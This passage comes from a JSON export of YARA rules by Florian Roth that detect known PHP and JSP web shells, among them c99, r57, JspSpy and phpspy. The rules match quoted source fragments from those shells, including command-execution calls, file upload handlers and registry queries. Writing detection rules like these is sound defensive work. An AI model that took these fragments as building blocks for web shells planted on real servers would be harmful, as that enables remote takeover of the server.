config.jsp, myxx.jsp, zend.jsp","minimum_yara":"1.7","name":"Webshell_config_myxx_zend_RID3161","reference":"-","required_modules":[],"rule_hash":"5828d058b26c402d7105e88399fa660a","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_JspSpyJDK51_luci_jsp_xxx_RID33CD : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:03:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"ports = \\\"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\\\";\" fullword\n      $s1 = \"private static class VEditPropertyInvoker extends DefaultInvoker {\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 15:03:21","description":"Detects Web Shell from tennc webshell repo","minimum_yara":"1.7","name":"Webshell_JspSpyJDK51_luci_jsp_xxx_RID33CD","reference":"-","required_modules":[],"rule_hash":"a4cc76d290fa4869c337385bb451d52e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_404_data_suiyue_RID303A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 404.jsp, data.jsp, suiyue.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:30:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \" sbCopy.append(\\\"<input type=button name=goback value=' \\\"+strBack[languageNo]+\" \n   condition: \n      all of them\n}","date":"2014-01-28 12:30:51","description":"Web Shell - from files 404.jsp, data.jsp, suiyue.jsp","minimum_yara":"1.7","name":"Webshell_404_data_suiyue_RID303A","reference":"-","required_modules":[],"rule_hash":"1fa3b8d156f22772ce6b87bb13e97d23","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_JFolder_Leo_RID2ECB : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:29:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"UplInfo info = UploadMonitor.getInfo(fi.clientFileName);\" fullword\n      $s5 = \"long time = (System.currentTimeMillis() - starttime) / 1000l;\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 11:29:41","description":"Detects Web Shell from tennc webshell repo","minimum_yara":"1.7","name":"Webshell_JFolder_Leo_RID2ECB","reference":"-","required_modules":[],"rule_hash":"04529b2eaceba8523cc4fb18dbbd510e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_browser_201_3_ma_download_RID3412 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:14:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"<small>jsp File Browser version <%= VERSION_NR%> by <a\" \n      $s3 = \"else if (fName.endsWith(\\\".mpg\\\") || fName.endsWith(\\\".mpeg\\\") || fName.endsWith\" \n   condition: \n      all of them\n}","date":"2014-01-28 15:14:51","description":"Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp","minimum_yara":"1.7","name":"Webshell_browser_201_3_ma_download_RID3412","reference":"-","required_modules":[],"rule_hash":"ab2e5aef5f0665e593d68bdf73ca7584","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_itsec_itsecteam_shell_jHn_RID34D2 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:46:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"echo $head.\\\"<font face='Tahoma' size='2'>Operating System : \\\".php_uname().\\\"<b\" \n      $s5 = \"echo \\\"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'\" \n   condition: \n      all of them\n}","date":"2014-01-28 15:46:51","description":"Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php","minimum_yara":"1.7","name":"Webshell_itsec_itsecteam_shell_jHn_RID34D2","reference":"-","required_modules":[],"rule_hash":"40f0538fde1618d9b10b80238632366f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Ghost_Icesword_Silic_RID329D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files ghost_source.php, icesword.php, silic.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:12:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $\" \n      $s6 = \"if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST[\" \n   condition: \n      all of them\n}","date":"2014-01-28 14:12:41","description":"Web Shell - from files ghost_source.php, icesword.php, silic.php","minimum_yara":"1.7","name":"Webshell_Ghost_Icesword_Silic_RID329D","reference":"-","required_modules":[],"rule_hash":"4afec5bdd4ba5e384281245bb46b05b4","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_spy2009_m_ma3_xxx_RID3F1D : DEMO T1012 T1050 T1100 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 23:06:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1012, T1050, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"\\\"<form action=\\\\\\\"\\\"+SHELL_NAME+\\\"?o=upload\\\\\\\" method=\\\\\\\"POST\\\\\\\" enctype=\" \n      $s9 = \"<option value='reg query \\\\\\\"HKLM\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\T\" \n   condition: \n      all of them\n}","date":"2014-01-28 23:06:01","description":"Detects Web Shell from tennc webshell repo","minimum_yara":"1.7","name":"Webshell_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_spy2009_m_ma3_xxx_RID3F1D","reference":"-","required_modules":[],"rule_hash":"c1c626fb06b9feb301da38662792d8ed","score":70,"tags":["T1100","T1012","DEMO","WEBSHELL","T1050"]},{"author":"Florian Roth","content":"rule Webshell_2_520_job_ma1_ma4_2_RID30B8 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:51:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"_url = \\\"jdbc:microsoft:sqlserver://\\\" + dbServer + \\\":\\\" + dbPort + \\\";User=\\\" \" \n      $s9 = \"result += \\\"<meta http-equiv=\\\\\\\"refresh\\\\\\\" content=\\\\\\\"2;url=\\\" + request.getR\" \n   condition: \n      all of them\n}","date":"2014-01-28 12:51:51","description":"Web Shell - from files 2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp","minimum_yara":"1.7","name":"Webshell_2_520_job_ma1_ma4_2_RID30B8","reference":"-","required_modules":[],"rule_hash":"4c692caa3a3f52ea4c3c14834300b269","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_wso2_5_1_wso2_5_wso2_RID31BD : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:35:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"$opt_charsets .= '<option value=\\\"'.$item.'\\\" '.($_POST['charset']==$item?'selec\" \n      $s8 = \".'</td><td><a href=\\\"#\\\" onclick=\\\"g(\\\\'FilesTools\\\\',null,\\\\''.urlencode($f['na\" \n   condition: \n      all of them\n}","date":"2014-01-28 13:35:21","description":"Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php","minimum_yara":"1.7","name":"Webshell_wso2_5_1_wso2_5_wso2_RID31BD","reference":"-","required_modules":[],"rule_hash":"31918cefe392268cefe21a2edcab1c39","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_phpspy_arabicspy_RID3167 : DEMO T1007 T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:21:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1007, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"$prog = isset($_POST['prog']) ? $_POST['prog'] : \\\"/c net start > \\\".$pathname.\" \n   condition: \n      all of them\n}","date":"2014-01-28 13:21:01","description":"Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php","minimum_yara":"1.7","name":"Webshell_phpspy_arabicspy_RID3167","reference":"-","required_modules":[],"rule_hash":"df281cb128ffc6561507c5b94ae34c69","score":70,"tags":["T1100","DEMO","WEBSHELL","T1007"]},{"author":"Florian Roth","content":"rule Webshell_C99_Shell_ci_Biz_RID3061 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:37:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"else {echo \\\"Running datapipe... ok! Connect to <b>\\\".getenv(\\\"SERVER_ADDR\\\"\" \n   condition: \n      all of them\n}","date":"2014-01-28 12:37:21","description":"Detects Web Shell from tennc webshell repo","minimum_yara":"1.7","name":"Webshell_C99_Shell_ci_Biz_RID3061","reference":"-","required_modules":[],"rule_hash":"e25cc383d7991c407f02f73dd26de4d2","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_2008_2009lite_2009mssql_RID31A2 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:30:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<a href=\\\"javascript:godir(\\\\''.$drive->Path.'/\\\\');\" \n      $s7 = \"p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all\" \n   condition: \n      all of them\n}","date":"2014-01-28 13:30:51","description":"Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php","minimum_yara":"1.7","name":"Webshell_2008_2009lite_2009mssql_RID31A2","reference":"-","required_modules":[],"rule_hash":"cd0588c25fb5ffaeb4b399d68707cc47","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99_c99shell_2_RID2F58 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files c99.php, c99shell.php, c99.php, c99shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:53:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"$bindport_pass = \\\"c99\\\";\" fullword\n      $s5 = \" else {echo \\\"<b>Execution PHP-code</b>\\\"; if (empty($eval_txt)) {$eval_txt = tr\" \n   condition: \n      1 of them\n}","date":"2014-01-28 11:53:11","description":"Web Shell - from files c99.php, c99shell.php, c99.php, c99shell.php","minimum_yara":"1.7","name":"Webshell_c99_c99shell_2_RID2F58","reference":"-","required_modules":[],"rule_hash":"2f7bbe9d541bb654db95f62f678472cd","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_QueryDong_spyjsp2010_t00ls_RID3421 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:17:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"table.append(\\\"<td nowrap> <a href=\\\\\\\"#\\\\\\\" onclick=\\\\\\\"view('\\\"+tbName+\\\"')\" \n      $s9 = \"\\\"<p><input type=\\\\\\\"hidden\\\\\\\" name=\\\\\\\"selectDb\\\\\\\" value=\\\\\\\"\\\"+selectDb+\\\"\" \n   condition: \n      all of them\n}","date":"2014-01-28 15:17:21","description":"Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp","minimum_yara":"1.7","name":"Webshell_QueryDong_spyjsp2010_t00ls_RID3421","reference":"-","required_modules":[],"rule_hash":"6c52e36458d84e9be08f0a5a5c65be3c","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r57shell_SnIpEr_EgY_SpIdEr_RID3416 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:15:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo sr(15,\\\"<b>\\\".$lang[$language.'_text58'].$arrow.\\\"</b>\\\",in('text','mk_name\" \n      $s3 = \"echo sr(15,\\\"<b>\\\".$lang[$language.'_text21'].$arrow.\\\"</b>\\\",in('checkbox','nf1\" \n      $s9 = \"echo sr(40,\\\"<b>\\\".$lang[$language.'_text26'].$arrow.\\\"</b>\\\",\\\"<select size=\" \n   condition: \n      all of them\n}","date":"2014-01-28 15:15:31","description":"Detects Web Shell from tennc webshell repo","minimum_yara":"1.7","name":"Webshell_r57shell_SnIpEr_EgY_SpIdEr_RID3416","reference":"-","required_modules":[],"rule_hash":"1fb3dc2fe172dbd865ded3a5b35631a2","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_JspSpy_xxx_RID2ED6 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:31:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\"<h2>Remote Control &raquo;</h2><input class=\\\\\\\"bt\\\\\\\" onclick=\\\\\\\"var\" \n      $s2 = \"\\\"<p>Current File (import new file name and new file)<br /><input class=\\\\\\\"inpu\" \n      $s3 = \"\\\"<p>Current file (fullpath)<br /><input class=\\\\\\\"input\\\\\\\" name=\\\\\\\"file\\\\\\\" i\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:31:31","description":"Detects Web Shell from tennc webshell repo","minimum_yara":"1.7","name":"Webshell_JspSpy_xxx_RID2ED6","reference":"-","required_modules":[],"rule_hash":"df491ccfe9e804918b1e5a52151316b3","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_JSP_MA_download_RID3037 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:30:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<input title=\\\"Upload selected file to the current working directory\\\" type=\\\"Su\" \n      $s5 = \"<input title=\\\"Launch command in current directory\\\" type=\\\"Submit\\\" class=\\\"but\" \n      $s6 = \"<input title=\\\"Delete all selected files and directories incl. subdirs\\\" class=\" \n   condition: \n      all of them\n}","date":"2014-01-28 12:30:21","description":"Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp","minimum_yara":"1.7","name":"Webshell_JSP_MA_download_RID3037","reference":"-","required_modules":[],"rule_hash":"ecf460f20e6edaee75a143760f9122c9","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_shell_phpspy_2006_arabicspy_RID3505 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:55:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype\" \n      $s8 = \"echo \\\"<form action=\\\\\\\"?action=shell&dir=\\\".urlencode($dir).\\\"\\\\\\\" method=\\\\\\\"P\" \n   condition: \n      all of them\n}","date":"2014-01-28 15:55:21","description":"Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php","minimum_yara":"1.7","name":"Webshell_shell_phpspy_2006_arabicspy_RID3505","reference":"-","required_modules":[],"rule_hash":"fba8e1250894255f0fc145c753d03098","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_in_JFolder_jfolder01_jsp_leo_warn_RID378A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 17:42:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"sbFile.append(\\\"  &nbsp;<a href=\\\\\\\"javascript:doForm('down','\\\"+formatPath(strD\" \n      $s9 = \"sbFile.append(\\\" &nbsp;<a href=\\\\\\\"javascript:doForm('edit','\\\"+formatPath(strDi\" \n   condition: \n      all of them\n}","date":"2014-01-28 17:42:51","description":"Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp","minimum_yara":"1.7","name":"Webshell_in_JFolder_jfolder01_jsp_leo_warn_RID378A","reference":"-","required_modules":[],"rule_hash":"1c8f5413d5cd5464617336fcb9dec33d","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99_locus7s_c99_w4cking_xxx_RID34BB : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:43:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$res = @shell_exec($cfe);\" fullword\n      $s8 = \"$res = @ob_get_contents();\" fullword\n      $s9 = \"@exec($cfe,$res);\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 15:43:01","description":"Detects Web Shell from tennc webshell repo","minimum_yara":"1.7","name":"Webshell_c99_locus7s_c99_w4cking_xxx_RID34BB","reference":"-","required_modules":[],"rule_hash":"8cab68ca8f928e765e8935e5f2d3015f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_2_520_icesword_job_ma1_ma4_2_RID3477 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:31:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"private String[] _textFileTypes = {\\\"txt\\\", \\\"htm\\\", \\\"html\\\", \\\"asp\\\", \\\"jsp\\\",\" \n      $s3 = \"\\\\\\\" name=\\\\\\\"upFile\\\\\\\" size=\\\\\\\"8\\\\\\\" class=\\\\\\\"textbox\\\\\\\" />&nbsp;<input typ\" \n      $s9 = \"if (request.getParameter(\\\"password\\\") == null && session.getAttribute(\\\"passwor\" \n   condition: \n      all of them\n}","date":"2014-01-28 15:31:41","description":"Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp","minimum_yara":"1.7","name":"Webshell_2_520_icesword_job_ma1_ma4_2_RID3477","reference":"-","required_modules":[],"rule_hash":"bfa84e29f9da5eeac734789090f3d8f7","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_lite_PHPSPY_RID2E97 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, PHPSPY.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:21:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"<input type=\\\"text\\\" name=\\\"command\\\" size=\\\"60\\\" value=\\\"<?=$_POST['comma\" \n      $s7 = \"echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\\\"\\\".$uploaddir.\\\"/\\\".$_FILE\" \n      $s8 = \"<option value=\\\"passthru\\\" <? if ($execfunc==\\\"passthru\\\") { echo \\\"selected\\\"; \" \n   condition: \n      2 of them\n}","date":"2014-01-28 11:21:01","description":"Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, PHPSPY.php","minimum_yara":"1.7","name":"Webshell_lite_PHPSPY_RID2E97","reference":"-","required_modules":[],"rule_hash":"cd12921a9d2f07dd375889576c345076","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Arabicspy_PHPSPY_RID3087 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files shell.php, phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, arabicspy.php, PHPSPY.php, hkrkoz.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:43:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$mainpath_info           = explode('/', $mainpath);\" fullword\n      $s6 = \"if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \\\"d\" \n   condition: \n      all of them\n}","date":"2014-01-28 12:43:41","description":"Web Shell - from files shell.php, phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, arabicspy.php, PHPSPY.php, hkrkoz.php","minimum_yara":"1.7","name":"Webshell_Arabicspy_PHPSPY_RID3087","reference":"-","required_modules":[],"rule_hash":"8b2b5259d6c51a38d2d0cb6c2d09373b","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_JspSpyJDK5_RID2E1D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:00:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"url_con.setRequestProperty(\\\"REFERER\\\", \\\"\\\"+fckal+\\\"\\\");\" fullword\n      $s9 = \"FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \\\"GBK\\\");\" fullword\n   condition: \n      1 of them\n}","date":"2014-01-28 11:00:41","description":"Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp","minimum_yara":"1.7","name":"Webshell_JspSpyJDK5_RID2E1D","reference":"-","required_modules":[],"rule_hash":"0f104480341785196c9a3eba43ec910f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Dive_Shell_Emperor_Hacking_Team_RID36B8 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files Dive Shell 1.0 - Emperor Hacking Team.php, phpshell.php, SimShell 1.0 - Simorgh Security MGZ.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 17:07:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals\" \n      $s9 = \"if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 17:07:51","description":"Web Shell - from files Dive Shell 1.0 - Emperor Hacking Team.php, phpshell.php, SimShell 1.0 - Simorgh Security MGZ.php","minimum_yara":"1.7","name":"Webshell_Dive_Shell_Emperor_Hacking_Team_RID36B8","reference":"-","required_modules":[],"rule_hash":"fb03c1fddd075f702a73605a80865153","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_JFolder_jfolder01_xxx_RID32B9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, suiyue.jsp, warn.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:17:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"&nbsp;<TEXTAREA NAME=\\\"cqq\\\" ROWS=\\\"20\\\" COLS=\\\"100%\\\"><%=sbCmd.toString()%></TE\" \n   condition: \n      all of them\n}","date":"2014-01-28 14:17:21","description":"Web Shell - from files 404.jsp, 